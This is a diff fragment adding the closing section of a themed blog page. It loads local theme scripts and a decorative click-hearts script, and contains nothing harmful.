+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/click.js"></script>
+
